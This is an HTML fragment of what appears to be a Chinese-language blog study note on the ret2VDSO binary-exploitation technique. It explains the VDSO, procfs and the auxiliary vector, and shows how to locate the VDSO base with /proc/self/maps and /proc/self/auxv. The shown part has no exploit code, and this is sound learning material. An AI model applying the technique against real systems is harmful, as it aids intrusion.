-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="ret2VDSO-技术"><a href="#ret2VDSO-技术" class="headerlink" title="ret2VDSO 技术"></a>ret2VDSO 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><p>好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧</p>
-<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-简介"><a href="#i-简介" class="headerlink" title="i 简介"></a>i 简介</h3><ol>
-<li><em>VDSO (Virtual Dynamically-linked Shared Object)</em>：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 <code>linux-vdso.so.1</code> 或 <code>linux-gate.so.1</code>。</li>
-<li>为了提供一些常用系统调用的用户态快速实现（如 <code>gettimeofday</code>、<code>clock_gettime</code>），避免频繁的用户态&#x2F;内核态切换。</li>
-<li>虽然表现为一个 <code>.so</code> 文件，但它并不存在于磁盘上，而是由内核在进程启动时映射到内存。</li>
-</ol>
-<h3 id="ii-补充"><a href="#ii-补充" class="headerlink" title="ii 补充"></a>ii 补充</h3><ol>
-<li>VDSO属于操作系统，它由内核生成，是内核在运行时动态构造并映射到进程地址空间。</li>
-<li>几乎每个用户态进程都会有一块 VDSO 区域，地址可能不同（受 ASLR 影响），但内容由内核统一提供。</li>
-<li>你的程序不需要显式链接 VDSO，内核会自动把它映射进去。即使你写一个最简单的 <code>int main(){return 0;}</code>，运行时也会有 VDSO。<em>就是说程序只是使用内核提供的VDSO共享区域，而不是像 ret2dlresolve 的符号表那样由程序生成</em></li>
-<li>与其说VDSO是一个共享库，不如说VDSO是内核映射出的一个共享区域(共享内存)，里面包含了一小段真正的可执行代码（ELF 格式的共享对象），提供一些常用系统调用的用户态实现。</li>
-</ol>
-<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>首先简单说一下命令（最底层的接口，gdb 的 vmmap也可以找到）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps → 输出当前进程的内存映射信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/self/auxv → 输出当前进程的 ELF 辅助向量信息。</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><code>/proc</code></h4><ul>
-<li>这是 Linux 的 <em>进程信息伪文件系统</em>（procfs）。</li>
-<li>作用：它不是存放在磁盘上的真实文件，而是内核提供的一种接口，用来查看和操作进程、内核状态。</li>
-<li>特点：里面的文件和目录都是动态生成的，反映的是系统当前的运行状态。</li>
-</ul>
-<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a><code>/proc/self</code></h4><ul>
-<li><code>self</code> 是一个特殊的符号链接，始终指向 <em>当前进程的目录</em>。</li>
-<li>作用：在 <code>/proc</code> 下，每个进程都有一个以 PID 命名的目录，比如 <code>/proc/1234</code>。<ul>
-<li>如果你在进程 A 中访问 <code>/proc/self</code>，它就等价于 <code>/proc/&lt;A的PID&gt;</code>。</li>
-</ul>
-</li>
-</ul>
-<h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a><code>/proc/self/maps</code></h4><ul>
-<li><code>maps</code> 指当前进程的 <em>内存映射表</em>。</li>
-<li>作用：列出进程地址空间中所有的内存区域，包括：<ul>
-<li>程序代码段、数据段</li>
-<li>堆 (<code>[heap]</code>)</li>
-<li>栈 (<code>[stack]</code>)</li>
-<li>动态库（如 libc）</li>
-<li>特殊区域（如 <code>[vdso]</code>）</li>
-</ul>
-</li>
-</ul>
-<h4 id="proc-self-auxv"><a href="#proc-self-auxv" class="headerlink" title="/proc/self/auxv"></a><code>/proc/self/auxv</code></h4><ul>
-<li><code>auxv</code>当前进程的 <strong>ELF 辅助向量</strong>。</li>
-<li>作用：这是内核在进程启动时传递给用户态的一组参数，包含运行环境信息，比如：<ul>
-<li><code>AT_SYSINFO_EHDR</code> → VDSO 的基址</li>
-<li><code>AT_EXECFN</code> → 可执行文件路径</li>
-<li><code>AT_PLATFORM</code> → CPU 架构</li>
-<li><code>AT_PAGESZ</code> → 页大小</li>
-</ul>
-</li>
-<li>用途：程序或调试器可以通过它直接获取 VDSO 基址、随机数种子等信息。</li>
-</ul>
-</blockquote>
 
       
     </div>
